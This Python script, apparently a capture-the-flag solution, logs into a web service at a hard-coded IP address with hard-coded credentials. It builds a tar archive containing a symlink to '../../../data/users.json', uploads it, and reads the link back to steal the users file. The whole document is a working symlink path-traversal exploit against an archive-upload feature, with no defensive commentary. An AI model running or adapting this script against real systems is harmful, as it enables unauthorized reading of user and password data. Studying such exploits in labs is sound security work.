import requests
import tarfile
import os
import time
import urllib.parse
import sys


BASE_URL = "http://124.197.22.141:5050"
USERNAME = "admin123"  
PASSWORD = "admin123"

s = requests.Session()

def solve():

    
    res = s.post(f"{BASE_URL}/api/login", json={"username": USERNAME, "password": PASSWORD})
    if res.status_code != 200:
        print("[-] Loggin failed:", res.text)
        return
        
    sid = s.cookies.get('sid')
    if not sid:
        print("[-] Error SID.")
        return

    print("[*] Logged in. Creating file exploit...")
    
    link_target = "../../../data/users.json"
    link_name = "steal_pass"
    tar_name = "debug_user.tar"

    with tarfile.open(tar_name, "w") as tar:
        info = tarfile.TarInfo(name=link_name)
        info.type = tarfile.SYMTYPE 
        info.linkname = link_target
        info.size = 0
        info.mtime = time.time()
        info.mode = 0o777
        tar.addfile(info)

    print("[*] Uploading...")
    try:
        with open(tar_name, 'rb') as f:
            res = s.post(f"{BASE_URL}/api/upload", files={'archive': (tar_name, f, 'application/x-tar')})
        
        
        if os.path.exists(tar_name): os.remove(tar_name)
        
        
        print(f"[*] Server Status Code: {res.status_code}")
        print(f"[*] Server Response: {res.text}") 
        

        if res.status_code != 200:
            print("[-] Upload failed.")
            return
            
        data = res.json()
        if 'extractionId' not in data:
            print("[-] JSON doesn't have extractionId.")
            return
            
        extract_id = data['extractionId']
        
        
        print(f"[*] Uploaded (ID: {extract_id}). Reading file...")
        res = s.get(f"{BASE_URL}/api/file", params={"extractionId": extract_id, "file": link_name})
        
        print("\n" + "="*40)
        print("USERS.JSON:")
        print(res.text)
        print("="*40 + "\n")

    except Exception as e:
        print("Script Error:", e)

if __name__ == "__main__":
    solve()